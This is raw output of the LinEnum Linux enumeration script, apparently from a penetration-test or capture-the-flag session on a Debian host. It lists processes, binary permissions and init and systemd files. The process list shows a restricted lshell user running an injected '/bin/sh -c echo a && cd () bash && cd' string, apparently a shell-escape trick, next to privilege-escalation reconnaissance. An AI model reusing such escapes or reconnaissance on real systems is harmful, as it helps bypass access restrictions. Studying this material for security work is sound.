root        23  0.0  0.0      0     0 ?        S<   08:33   0:00 [writeback]
root        24  0.0  0.0      0     0 ?        S    08:33   0:00 [kcompactd0]
root        26  0.0  0.0      0     0 ?        SN   08:33   0:00 [ksmd]
root        27  0.0  0.0      0     0 ?        SN   08:33   0:00 [khugepaged]
root        28  0.0  0.0      0     0 ?        S<   08:33   0:00 [crypto]
root        29  0.0  0.0      0     0 ?        S<   08:33   0:00 [kintegrityd]
root        30  0.0  0.0      0     0 ?        S<   08:33   0:00 [bioset]
root        31  0.0  0.0      0     0 ?        S<   08:33   0:00 [kblockd]
root        32  0.0  0.0      0     0 ?        S<   08:33   0:00 [devfreq_wq]
root        33  0.0  0.0      0     0 ?        S<   08:33   0:00 [watchdogd]
root        35  0.0  0.0      0     0 ?        S    08:33   0:00 [kswapd0]
root        36  0.0  0.0      0     0 ?        S<   08:33   0:00 [vmstat]
root        48  0.0  0.0      0     0 ?        S<   08:33   0:00 [kthrotld]
root        49  0.0  0.0      0     0 ?        S<   08:33   0:00 [ipv6_addrconf]
root        80  0.0  0.0      0     0 ?        S<   08:33   0:00 [ata_sff]
root        81  0.0  0.0      0     0 ?        S    08:33   0:00 [scsi_eh_0]
root        82  0.0  0.0      0     0 ?        S<   08:33   0:00 [scsi_tmf_0]
root        83  0.0  0.0      0     0 ?        S    08:33   0:00 [scsi_eh_1]
root        84  0.0  0.0      0     0 ?        S<   08:33   0:00 [scsi_tmf_1]
root        94  0.0  0.0      0     0 ?        S<   08:33   0:00 [bioset]
root        95  0.0  0.0      0     0 ?        S<   08:33   0:00 [bioset]
root        96  0.0  0.0      0     0 ?        S<   08:33   0:00 [bioset]
root        97  0.0  0.0      0     0 ?        S<   08:33   0:00 [bioset]
root        98  0.0  0.0      0     0 ?        S<   08:33   0:00 [bioset]
root        99  0.0  0.0      0     0 ?        S<   08:33   0:00 [bioset]
root       100  0.0  0.0      0     0 ?        S<   08:33   0:00 [bioset]
root       101  0.0  0.0      0     0 ?        S<   08:33   0:00 [bioset]
root       103  0.0  0.0      0     0 ?        S    08:33   0:00 [scsi_eh_2]
root       104  0.0  0.0      0     0 ?        S<   08:33   0:00 [scsi_tmf_2]
root       105  0.0  0.0      0     0 ?        S<   08:33   0:00 [bioset]
root       361  0.0  0.0      0     0 ?        S<   08:33   0:00 [bioset]
root       365  0.0  0.0      0     0 ?        S<   08:33   0:00 [kworker/0:1H]
root       391  0.0  0.0      0     0 ?        S<   08:34   0:00 [kworker/1:1H]
root       404  0.0  0.0      0     0 ?        S<   08:35   0:00 [kdmflush]
root       406  0.0  0.0      0     0 ?        S<   08:35   0:00 [bioset]
root       407  0.0  0.0      0     0 ?        S<   08:35   0:00 [kcryptd_io]
root       408  0.0  0.0      0     0 ?        S<   08:35   0:00 [kcryptd]
root       409  0.0  0.0      0     0 ?        S    08:35   0:00 [dmcrypt_write]
root       410  0.0  0.0      0     0 ?        S<   08:35   0:00 [bioset]
root       418  0.0  0.0      0     0 ?        S<   08:35   0:00 [kdmflush]
root       419  0.0  0.0      0     0 ?        S<   08:35   0:00 [bioset]
root       422  0.0  0.0      0     0 ?        S<   08:35   0:00 [kdmflush]
root       424  0.0  0.0      0     0 ?        S<   08:35   0:00 [bioset]
root       462  0.0  0.0      0     0 ?        S<   08:35   0:00 [kworker/u5:0]
root       477  0.0  0.0      0     0 ?        S    08:35   0:00 [jbd2/dm-1-8]
root       478  0.0  0.0      0     0 ?        S<   08:35   0:00 [ext4-rsv-conver]
root       510  0.0  0.1  42964  4992 ?        Ss   08:35   0:00 /lib/systemd/systemd-journald
root       514  0.0  0.0      0     0 ?        S    08:35   0:00 [kauditd]
root       534  0.0  0.0 107196  1612 ?        Ss   08:35   0:00 /sbin/lvmetad -f
root       538  0.0  0.1  46772  4628 ?        Ss   08:35   0:00 /lib/systemd/systemd-udevd
root       544  0.0  0.0      0     0 ?        S<   08:35   0:00 [rpciod]
root       545  0.0  0.0      0     0 ?        S<   08:35   0:00 [xprtiod]
root       588  0.0  0.0      0     0 ?        S<   08:35   0:00 [ttm_swap]
root       676  0.0  0.0      0     0 ?        S<   08:36   0:00 [ext4-rsv-conver]
root       706  0.0  0.0  49868  3384 ?        Ss   08:36   0:00 /sbin/rpcbind -f -w
systemd+   708  0.0  0.1 127284  4136 ?        Ssl  08:36   0:00 /lib/systemd/systemd-timesyncd
message+   724  0.0  0.0  45120  3836 ?        Ss   08:36   0:00 /usr/bin/dbus-daemon --system --address
root       728  0.0  0.1  46492  4512 ?        Ss   08:36   0:00 /lib/systemd/systemd-logind
root       729  0.0  0.0  29636  2724 ?        Ss   08:36   0:00 /usr/sbin/cron -f
root       730  0.0  0.0 250112  3152 ?        Ssl  08:36   0:00 /usr/sbin/rsyslogd -n
root       750  0.0  0.0      0     0 ?        S<   08:36   0:00 [nfsiod]
root       759  0.0  0.1  69952  6052 ?        Ss   08:36   0:00 /usr/sbin/sshd -D
root       766  0.0  0.0      0     0 ?        S    08:36   0:00 [NFSv4 callback]
root       778  0.0  0.0  14524  1552 tty1     Ss+  08:36   0:00 /sbin/agetty --noclear tty1 linux
Debian-+  1026  0.0  0.0  56152  2944 ?        Ss   08:36   0:00 /usr/sbin/exim4 -bd -q30m
georgina  1093  0.0  0.1  64832  6104 ?        Ss   08:41   0:00 /lib/systemd/systemd --user
georgina  1094  0.0  0.0  82588  1656 ?        S    08:41   0:00 (sd-pam)
root      1731  0.0  0.1  95180  6744 ?        Ss   14:34   0:00 sshd: georgina [priv]
georgina  1737  0.0  0.0  95180  3716 ?        S    14:34   0:00 sshd: georgina@pts/0
georgina  1738  0.0  0.1  21304  5164 pts/0    Ss+  14:34   0:00 -bash
root      1779  0.0  0.0      0     0 ?        S    14:37   0:02 [kworker/0:1]
root      1780  0.0  0.1  95180  6652 ?        Ss   14:38   0:00 sshd: root@pts/2
root      1782  0.0  0.1  56392  5676 ?        Ss   14:38   0:00 /lib/systemd/systemd --user
root      1783  0.0  0.0  82588  1664 ?        S    14:38   0:00 (sd-pam)
root      1789  0.0  0.1  21308  5184 pts/2    Ss+  14:38   0:00 -bash
root      1916  0.0  0.1  95180  6684 ?        Ss   14:51   0:00 sshd: georgina [priv]
georgina  1922  0.0  0.0  95180  3752 ?        S    14:51   0:00 sshd: georgina@pts/3
georgina  1923  0.0  0.1  21476  5344 pts/3    Ss   14:51   0:00 -bash
root      1948  0.0  0.0      0     0 ?        S    14:55   0:00 [kworker/0:3]
root      1949  0.0  0.1  95180  6720 ?        Ss   14:56   0:00 sshd: georgina [priv]
georgina  1955  0.0  0.0  95180  3624 ?        S    14:56   0:00 sshd: georgina@pts/4
georgina  1956  0.0  0.1  21300  5044 pts/4    Ss+  14:56   0:00 -bash
root      1965  0.0  0.1  95180  6768 ?        Ss   14:56   0:00 sshd: root@pts/5
root      1971  0.0  0.1  21308  5236 pts/5    Ss+  14:56   0:00 -bash
root      1985  0.0  0.0      0     0 ?        S    14:56   0:00 [kworker/u4:3]
root      2040  0.0  0.0   4168   636 pts/3    S+   15:00   0:00 ./exportVIP
root      2157  0.0  0.0      0     0 ?        S    15:12   0:00 [kworker/u4:2]
root      2159  0.0  0.0      0     0 ?        S    15:13   0:00 [kworker/1:0]
root      2180  0.0  0.1  95180  6776 ?        Ss   15:16   0:00 sshd: violet [priv]
violet    2182  0.0  0.1  64836  5988 ?        Ss   15:16   0:00 /lib/systemd/systemd --user
violet    2183  0.0  0.0  82588  1668 ?        S    15:16   0:00 (sd-pam)
violet    2189  0.0  0.0  95180  3820 ?        S    15:16   0:00 sshd: violet@pts/1
violet    2190  0.0  0.3  52664 13304 pts/1    Ss   15:16   0:00 /usr/bin/python /usr/bin/lshell
root      2191  0.0  0.1  95180  6708 ?        Ss   15:16   0:00 sshd: violet [priv]
violet    2197  0.0  0.0  95180  3844 ?        S    15:16   0:00 sshd: violet@pts/6
violet    2198  0.0  0.3  52664 13284 pts/6    Ss   15:16   0:00 /usr/bin/python /usr/bin/lshell
violet    2202  0.0  0.0   4276   744 pts/6    S    15:17   0:00 /bin/sh -c echo a && cd () bash && cd
violet    2203  0.0  0.1  21312  5092 pts/6    S    15:17   0:00 bash
violet    2208  0.0  0.0   4276   704 pts/1    S    15:17   0:00 /bin/sh -c echo a && cd () bash && cd
violet    2209  0.0  0.1  21300  4936 pts/1    S+   15:17   0:00 bash
root      2225  0.0  0.0      0     0 ?        S    15:20   0:00 [kworker/1:2]
violet    2226  0.0  0.0  12164  3964 pts/6    S+   15:25   0:00 /bin/bash ./LinEnum.sh -s -r report -e 
violet    2228  0.0  0.0  12220  3512 pts/6    S+   15:25   0:00 /bin/bash ./LinEnum.sh -s -r report -e 
violet    2229  0.0  0.0   6144   660 pts/6    S+   15:25   0:00 tee -a report-19-07-19
root      2324  0.1  0.0      0     0 ?        S    15:25   0:00 [kworker/u4:0]
root      2337  0.0  0.0      0     0 ?        S    15:25   0:00 [kworker/u4:1]
root      2338  0.0  0.0      0     0 ?        S    15:26   0:00 [kworker/1:1]
systemd+  2712  1.0  0.1  49620  4220 ?        Ss   15:26   0:00 /lib/systemd/systemd-resolved
root      2713  0.0  0.0      0     0 ?        Ds   15:26   0:00 [sh]
violet    2732  0.0  0.0  12204  2832 pts/6    S+   15:26   0:00 /bin/bash ./LinEnum.sh -s -r report -e 
violet    2733  0.0  0.0  38304  3196 pts/6    R+   15:26   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
1,1M -rwxr-xr-x 1 root root 1,1M mai   15  2017 /bin/bash
   0 lrwxrwxrwx 1 root root    4 janv. 24  2017 /bin/sh -> dash
1,1M -rwxr-xr-x 1 root root 1,1M avril  8 12:51 /lib/systemd/systemd
120K -rwxr-xr-x 1 root root 119K avril  8 12:51 /lib/systemd/systemd-journald
204K -rwxr-xr-x 1 root root 203K avril  8 12:51 /lib/systemd/systemd-logind
316K -rwxr-xr-x 1 root root 315K avril  8 12:51 /lib/systemd/systemd-resolved
 40K -rwxr-xr-x 1 root root  39K avril  8 12:51 /lib/systemd/systemd-timesyncd
456K -rwxr-xr-x 1 root root 455K avril  8 12:51 /lib/systemd/systemd-udevd
 60K -rwxr-xr-x 1 root root  57K mars   7  2018 /sbin/agetty
   0 lrwxrwxrwx 1 root root   20 avril  8 12:51 /sbin/init -> /lib/systemd/systemd
 68K -rwxr-xr-x 1 root root  67K mars  17  2017 /sbin/lvmetad
 52K -rwxr-xr-x 1 root root  52K mai    5  2017 /sbin/rpcbind
220K -rwxr-xr-x 1 root root 219K juin   9 23:42 /usr/bin/dbus-daemon
   0 lrwxrwxrwx 1 root root    9 janv. 24  2017 /usr/bin/python -> python2.7
 48K -rwxr-xr-x 1 root root  48K oct.   7  2017 /usr/sbin/cron
996K -rwsr-xr-x 1 root root 996K mai   28 22:13 /usr/sbin/exim4
640K -rwxr-xr-x 1 root root 637K janv. 18  2017 /usr/sbin/rsyslogd
776K -rwxr-xr-x 1 root root 773K mars   1 17:19 /usr/sbin/sshd


[-] /etc/init.d/ binary permissions:
total 112
drwxr-xr-x  2 root root 4096 juin  25 10:39 .
drwxr-xr-x 80 root root 4096 juil.  5 14:56 ..
-rwxr-xr-x  1 root root 1232 avril  7  2017 console-setup.sh
-rwxr-xr-x  1 root root 3049 oct.   7  2017 cron
-rwxr-xr-x  1 root root  937 mai    9  2017 cryptdisks
-rwxr-xr-x  1 root root  896 mai    9  2017 cryptdisks-early
-rwxr-xr-x  1 root root 2813 juin   9 23:42 dbus
-rwxr-xr-x  1 root root 6754 mai   28 22:13 exim4
-rwxr-xr-x  1 root root 3809 mars   7  2018 hwclock.sh
-rwxr-xr-x  1 root root 1479 mai   19  2016 keyboard-setup.sh
-rwxr-xr-x  1 root root 2044 déc.  26  2016 kmod
-rwxr-xr-x  1 root root  695 mars  17  2017 lvm2
-rwxr-xr-x  1 root root  571 mars  17  2017 lvm2-lvmetad
-rwxr-xr-x  1 root root  586 mars  17  2017 lvm2-lvmpolld
-rwxr-xr-x  1 root root 4597 sept. 16  2016 networking
-rwxr-xr-x  1 root root 5658 déc.  15  2016 nfs-common
-rwxr-xr-x  1 root root 1191 mai   17  2018 procps
-rwxr-xr-x  1 root root 2358 mai    5  2017 rpcbind
-rwxr-xr-x  1 root root 4355 déc.  10  2017 rsync
-rwxr-xr-x  1 root root 2868 janv. 18  2017 rsyslog
-rwxr-xr-x  1 root root 4033 mars   1 17:19 ssh
-rwxr-xr-x  1 root root  731 juin   5  2017 sudo
-rwxr-xr-x  1 root root 6087 avril  8 12:51 udev


[-] /etc/init/ config file permissions:
total 60
drwxr-xr-x  2 root root 4096 juin  24 17:55 .
drwxr-xr-x 80 root root 4096 juil.  5 14:56 ..
-rw-r--r--  1 root root 1519 mai    9  2017 cryptdisks.conf
-rw-r--r--  1 root root  412 mai    9  2017 cryptdisks-udev.conf
-rw-r--r--  1 root root 2493 juin   2  2015 networking.conf
-rw-r--r--  1 root root  933 juin   2  2015 network-interface.conf
-rw-r--r--  1 root root  530 juin   2  2015 network-interface-container.conf
-rw-r--r--  1 root root 1756 juin   2  2015 network-interface-security.conf
-rw-r--r--  1 root root  815 mai    5  2017 portmap-wait.conf
-rw-r--r--  1 root root  230 mai    5  2017 rpcbind-boot.conf
-rw-r--r--  1 root root 1083 mai    5  2017 rpcbind.conf
-rw-r--r--  1 root root  637 mars   1 17:19 ssh.conf
-rw-r--r--  1 root root  337 avril  8 12:51 udev.conf
-rw-r--r--  1 root root  360 avril  8 12:51 udevmonitor.conf
-rw-r--r--  1 root root  352 avril  8 12:51 udevtrigger.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 5,3M
drwxr-xr-x 19 root root  16K juil.  2 16:04 system
drwxr-xr-x  2 root root 4,0K juin  21 17:13 system-sleep
drwxr-xr-x  2 root root 4,0K juin  21 17:06 system-generators
drwxr-xr-x  2 root root 4,0K juin  21 17:05 network
drwxr-xr-x  2 root root 4,0K juin  21 17:04 system-preset
-rw-r--r--  1 root root 2,2M avril  8 12:51 libsystemd-shared-232.so
-rw-r--r--  1 root root  484 avril  8 12:51 resolv.conf
-rwxr-xr-x  1 root root 1,1M avril  8 12:51 systemd
-rwxr-xr-x  1 root root 6,3K avril  8 12:51 systemd-ac-power
-rwxr-xr-x  1 root root  19K avril  8 12:51 systemd-backlight
-rwxr-xr-x  1 root root  11K avril  8 12:51 systemd-binfmt
-rwxr-xr-x  1 root root  11K avril  8 12:51 systemd-cgroups-agent
-rwxr-xr-x  1 root root  27K avril  8 12:51 systemd-cryptsetup
-rwxr-xr-x  1 root root  19K avril  8 12:51 systemd-fsck
-rwxr-xr-x  1 root root  23K avril  8 12:51 systemd-fsckd
-rwxr-xr-x  1 root root  11K avril  8 12:51 systemd-hibernate-resume
-rwxr-xr-x  1 root root  23K avril  8 12:51 systemd-hostnamed
-rwxr-xr-x  1 root root  15K avril  8 12:51 systemd-initctl
-rwxr-xr-x  1 root root 119K avril  8 12:51 systemd-journald
-rwxr-xr-x  1 root root  35K avril  8 12:51 systemd-localed
-rwxr-xr-x  1 root root 203K avril  8 12:51 systemd-logind
-rwxr-xr-x  1 root root  15K avril  8 12:51 systemd-modules-load
-rwxr-xr-x  1 root root 415K avril  8 12:51 systemd-networkd
-rwxr-xr-x  1 root root  19K avril  8 12:51 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  11K avril  8 12:51 systemd-quotacheck
-rwxr-xr-x  1 root root  11K avril  8 12:51 systemd-random-seed
-rwxr-xr-x  1 root root  15K avril  8 12:51 systemd-remount-fs
-rwxr-xr-x  1 root root  11K avril  8 12:51 systemd-reply-password
-rwxr-xr-x  1 root root 315K avril  8 12:51 systemd-resolved
-rwxr-xr-x  1 root root  19K avril  8 12:51 systemd-rfkill
-rwxr-xr-x  1 root root  39K avril  8 12:51 systemd-shutdown
-rwxr-xr-x  1 root root  15K avril  8 12:51 systemd-sleep
-rwxr-xr-x  1 root root  23K avril  8 12:51 systemd-socket-proxyd
-rwxr-xr-x  1 root root  15K avril  8 12:51 systemd-sysctl
-rwxr-xr-x  1 root root 1,3K avril  8 12:51 systemd-sysv-install
-rwxr-xr-x  1 root root  27K avril  8 12:51 systemd-timedated
-rwxr-xr-x  1 root root  39K avril  8 12:51 systemd-timesyncd
-rwxr-xr-x  1 root root 455K avril  8 12:51 systemd-udevd
-rwxr-xr-x  1 root root  15K avril  8 12:51 systemd-update-utmp
-rwxr-xr-x  1 root root  11K avril  8 12:51 systemd-user-sessions
drwxr-xr-x  2 root root 4,0K avril  8 12:51 system-shutdown

/lib/systemd/system:
total 744K
drwxr-xr-x 2 root root 4,0K juin  21 17:12 multi-user.target.wants
drwxr-xr-x 2 root root 4,0K juin  21 17:12 sockets.target.wants
drwxr-xr-x 2 root root 4,0K juin  21 17:05 sysinit.target.wants
drwxr-xr-x 2 root root 4,0K juin  21 17:04 getty.target.wants
drwxr-xr-x 2 root root 4,0K juin  21 17:04 graphical.target.wants
drwxr-xr-x 2 root root 4,0K juin  21 17:04 local-fs.target.wants
drwxr-xr-x 2 root root 4,0K juin  21 17:04 rescue.target.wants
drwxr-xr-x 2 root root 4,0K juin  21 17:04 timers.target.wants
drwxr-xr-x 2 root root 4,0K juin  21 17:04 systemd-resolved.service.d
drwxr-xr-x 2 root root 4,0K juin  21 17:04 systemd-timesyncd.service.d
drwxr-xr-x 2 root root 4,0K juin  21 17:04 rc-local.service.d
-rw-r--r-- 1 root root  366 juin   9 23:42 dbus.service
-rw-r--r-- 1 root root  106 juin   9 23:42 dbus.socket
lrwxrwxrwx 1 root root   14 avril  8 12:51 autovt@.service -> getty@.service
-rw-r--r-- 1 root root  879 avril  8 12:51 basic.target
-rw-r--r-- 1 root root  379 avril  8 12:51 bluetooth.target
lrwxrwxrwx 1 root root    9 avril  8 12:51 bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 bootlogs.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 bootmisc.service -> /dev/null
-rw-r--r-- 1 root root  358 avril  8 12:51 busnames.target
drwxr-xr-x 2 root root 4,0K avril  8 12:51 busnames.target.wants
lrwxrwxrwx 1 root root    9 avril  8 12:51 checkfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 checkroot.service -> /dev/null
-rw-r--r-- 1 root root  770 avril  8 12:51 console-getty.service
-rw-r--r-- 1 root root  791 avril  8 12:51 container-getty@.service
lrwxrwxrwx 1 root root    9 avril  8 12:51 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 cryptdisks.service -> /dev/null
-rw-r--r-- 1 root root  394 avril  8 12:51 cryptsetup-pre.target
-rw-r--r-- 1 root root  366 avril  8 12:51 cryptsetup.target
lrwxrwxrwx 1 root root   13 avril  8 12:51 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 avril  8 12:51 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 avril  8 12:51 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 avril  8 12:51 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   24 avril  8 12:51 dbus-org.freedesktop.network1.service -> systemd-networkd.service
lrwxrwxrwx 1 root root   24 avril  8 12:51 dbus-org.freedesktop.resolve1.service -> systemd-resolved.service
lrwxrwxrwx 1 root root   25 avril  8 12:51 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
-rw-r--r-- 1 root root 1010 avril  8 12:51 debug-shell.service
lrwxrwxrwx 1 root root   16 avril  8 12:51 default.target -> graphical.target
-rw-r--r-- 1 root root  709 avril  8 12:51 dev-hugepages.mount
-rw-r--r-- 1 root root  624 avril  8 12:51 dev-mqueue.mount
-rw-r--r-- 1 root root 1,1K avril  8 12:51 emergency.service
-rw-r--r-- 1 root root  431 avril  8 12:51 emergency.target
-rw-r--r-- 1 root root  501 avril  8 12:51 exit.target
-rw-r--r-- 1 root root  440 avril  8 12:51 final.target
lrwxrwxrwx 1 root root    9 avril  8 12:51 fuse.service -> /dev/null
-rw-r--r-- 1 root root 1,7K avril  8 12:51 getty@.service
-rw-r--r-- 1 root root  342 avril  8 12:51 getty-static.service
-rw-r--r-- 1 root root  460 avril  8 12:51 getty.target
-rw-r--r-- 1 root root  558 avril  8 12:51 graphical.target
lrwxrwxrwx 1 root root    9 avril  8 12:51 halt.service -> /dev/null
-rw-r--r-- 1 root root  487 avril  8 12:51 halt.target
-rw-r--r-- 1 root root  447 avril  8 12:51 hibernate.target
lrwxrwxrwx 1 root root    9 avril  8 12:51 hostname.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 hwclock.service -> /dev/null
-rw-r--r-- 1 root root  468 avril  8 12:51 hybrid-sleep.target
-rw-r--r-- 1 root root  630 avril  8 12:51 initrd-cleanup.service
-rw-r--r-- 1 root root  553 avril  8 12:51 initrd-fs.target
-rw-r--r-- 1 root root  790 avril  8 12:51 initrd-parse-etc.service
-rw-r--r-- 1 root root  521 avril  8 12:51 initrd-root-device.target
-rw-r--r-- 1 root root  526 avril  8 12:51 initrd-root-fs.target
-rw-r--r-- 1 root root  640 avril  8 12:51 initrd-switch-root.service
-rw-r--r-- 1 root root  714 avril  8 12:51 initrd-switch-root.target
-rw-r--r-- 1 root root  723 avril  8 12:51 initrd.target
-rw-r--r-- 1 root root  664 avril  8 12:51 initrd-udevadm-cleanup-db.service
-rw-r--r-- 1 root root  501 avril  8 12:51 kexec.target
lrwxrwxrwx 1 root root    9 avril  8 12:51 killprocs.service -> /dev/null
lrwxrwxrwx 1 root root   28 avril  8 12:51 kmod.service -> systemd-modules-load.service
-rw-r--r-- 1 root root  677 avril  8 12:51 kmod-static-nodes.service
-rw-r--r-- 1 root root  395 avril  8 12:51 local-fs-pre.target
-rw-r--r-- 1 root root  507 avril  8 12:51 local-fs.target
-rw-r--r-- 1 root root  405 avril  8 12:51 machine.slice
lrwxrwxrwx 1 root root   28 avril  8 12:51 module-init-tools.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root    9 avril  8 12:51 motd.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 mountall-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 mountall.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 mountdevsubfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 mountkernfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 mountnfs.service -> /dev/null
-rw-r--r-- 1 root root  492 avril  8 12:51 multi-user.target
-rw-r--r-- 1 root root  464 avril  8 12:51 network-online.target
-rw-r--r-- 1 root root  461 avril  8 12:51 network-pre.target
-rw-r--r-- 1 root root  480 avril  8 12:51 network.target
-rw-r--r-- 1 root root  514 avril  8 12:51 nss-lookup.target
-rw-r--r-- 1 root root  473 avril  8 12:51 nss-user-lookup.target
-rw-r--r-- 1 root root  354 avril  8 12:51 paths.target
-rw-r--r-- 1 root root  552 avril  8 12:51 poweroff.target
-rw-r--r-- 1 root root  377 avril  8 12:51 printer.target
lrwxrwxrwx 1 root root   22 avril  8 12:51 procps.service -> systemd-sysctl.service
-rw-r--r-- 1 root root  693 avril  8 12:51 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  603 avril  8 12:51 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  568 avril  8 12:51 quotaon.service
-rw-r--r-- 1 root root  628 avril  8 12:51 rc-local.service
lrwxrwxrwx 1 root root   16 avril  8 12:51 rc.local.service -> rc-local.service
lrwxrwxrwx 1 root root    9 avril  8 12:51 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 rcS.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 reboot.service -> /dev/null
-rw-r--r-- 1 root root  543 avril  8 12:51 reboot.target
-rw-r--r-- 1 root root  396 avril  8 12:51 remote-fs-pre.target
-rw-r--r-- 1 root root  482 avril  8 12:51 remote-fs.target
-rw-r--r-- 1 root root 1022 avril  8 12:51 rescue.service
-rw-r--r-- 1 root root  486 avril  8 12:51 rescue.target
lrwxrwxrwx 1 root root    9 avril  8 12:51 rmnologin.service -> /dev/null
-rw-r--r-- 1 root root  500 avril  8 12:51 rpcbind.target
lrwxrwxrwx 1 root root   15 avril  8 12:51 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 avril  8 12:51 runlevel1.target -> rescue.target
drwxr-xr-x 2 root root 4,0K avril  8 12:51 runlevel1.target.wants
lrwxrwxrwx 1 root root   17 avril  8 12:51 runlevel2.target -> multi-user.target
drwxr-xr-x 2 root root 4,0K avril  8 12:51 runlevel2.target.wants
lrwxrwxrwx 1 root root   17 avril  8 12:51 runlevel3.target -> multi-user.target
drwxr-xr-x 2 root root 4,0K avril  8 12:51 runlevel3.target.wants
lrwxrwxrwx 1 root root   17 avril  8 12:51 runlevel4.target -> multi-user.target
drwxr-xr-x 2 root root 4,0K avril  8 12:51 runlevel4.target.wants
lrwxrwxrwx 1 root root   16 avril  8 12:51 runlevel5.target -> graphical.target
drwxr-xr-x 2 root root 4,0K avril  8 12:51 runlevel5.target.wants
lrwxrwxrwx 1 root root   13 avril  8 12:51 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root    9 avril  8 12:51 sendsigs.service -> /dev/null
-rw-r--r-- 1 root root 1,1K avril  8 12:51 serial-getty@.service
-rw-r--r-- 1 root root  402 avril  8 12:51 shutdown.target
-rw-r--r-- 1 root root  362 avril  8 12:51 sigpwr.target
lrwxrwxrwx 1 root root    9 avril  8 12:51 single.service -> /dev/null
-rw-r--r-- 1 root root  420 avril  8 12:51 sleep.target
-rw-r--r-- 1 root root  409 avril  8 12:51 slices.target
-rw-r--r-- 1 root root  380 avril  8 12:51 smartcard.target
-rw-r--r-- 1 root root  356 avril  8 12:51 sockets.target
-rw-r--r-- 1 root root  380 avril  8 12:51 sound.target
lrwxrwxrwx 1 root root    9 avril  8 12:51 stop-bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 stop-bootlogd-single.service -> /dev/null
-rw-r--r-- 1 root root  441 avril  8 12:51 suspend.target
-rw-r--r-- 1 root root  353 avril  8 12:51 swap.target
-rw-r--r-- 1 root root  715 avril  8 12:51 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  518 avril  8 12:51 sysinit.target
-rw-r--r-- 1 root root  719 avril  8 12:51 sys-kernel-config.mount
-rw-r--r-- 1 root root  662 avril  8 12:51 sys-kernel-debug.mount
-rw-r--r-- 1 root root 1,3K avril  8 12:51 syslog.socket
-rw-r--r-- 1 root root  664 avril  8 12:51 systemd-ask-password-console.path
-rw-r--r-- 1 root root  653 avril  8 12:51 systemd-ask-password-console.service
-rw-r--r-- 1 root root  592 avril  8 12:51 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  681 avril  8 12:51 systemd-ask-password-wall.service
-rw-r--r-- 1 root root  724 avril  8 12:51 systemd-backlight@.service
-rw-r--r-- 1 root root  959 avril  8 12:51 systemd-binfmt.service
-rw-r--r-- 1 root root  497 avril  8 12:51 systemd-exit.service
-rw-r--r-- 1 root root  551 avril  8 12:51 systemd-fsckd.service
-rw-r--r-- 1 root root  540 avril  8 12:51 systemd-fsckd.socket
-rw-r--r-- 1 root root  674 avril  8 12:51 systemd-fsck-root.service
-rw-r--r-- 1 root root  675 avril  8 12:51 systemd-fsck@.service
-rw-r--r-- 1 root root  544 avril  8 12:51 systemd-halt.service
-rw-r--r-- 1 root root  631 avril  8 12:51 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  501 avril  8 12:51 systemd-hibernate.service
-rw-r--r-- 1 root root  930 avril  8 12:51 systemd-hostnamed.service
-rw-r--r-- 1 root root  778 avril  8 12:51 systemd-hwdb-update.service
-rw-r--r-- 1 root root  519 avril  8 12:51 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  480 avril  8 12:51 systemd-initctl.service
-rw-r--r-- 1 root root  524 avril  8 12:51 systemd-initctl.socket
-rw-r--r-- 1 root root  607 avril  8 12:51 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1,1K avril  8 12:51 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root 1,5K avril  8 12:51 systemd-journald.service
-rw-r--r-- 1 root root  842 avril  8 12:51 systemd-journald.socket
-rw-r--r-- 1 root root  731 avril  8 12:51 systemd-journal-flush.service
-rw-r--r-- 1 root root  557 avril  8 12:51 systemd-kexec.service
-rw-r--r-- 1 root root  911 avril  8 12:51 systemd-localed.service
-rw-r--r-- 1 root root 1,4K avril  8 12:51 systemd-logind.service
-rw-r--r-- 1 root root  693 avril  8 12:51 systemd-machine-id-commit.service
-rw-r--r-- 1 root root  967 avril  8 12:51 systemd-modules-load.service
-rw-r--r-- 1 root root 1,5K avril  8 12:51 systemd-networkd.service
-rw-r--r-- 1 root root  591 avril  8 12:51 systemd-networkd.socket
-rw-r--r-- 1 root root  685 avril  8 12:51 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root  553 avril  8 12:51 systemd-poweroff.service
-rw-r--r-- 1 root root  614 avril  8 12:51 systemd-quotacheck.service
-rw-r--r-- 1 root root  752 avril  8 12:51 systemd-random-seed.service
-rw-r--r-- 1 root root  548 avril  8 12:51 systemd-reboot.service
-rw-r--r-- 1 root root  757 avril  8 12:51 systemd-remount-fs.service
-rw-r--r-- 1 root root 1,5K avril  8 12:51 systemd-resolved.service
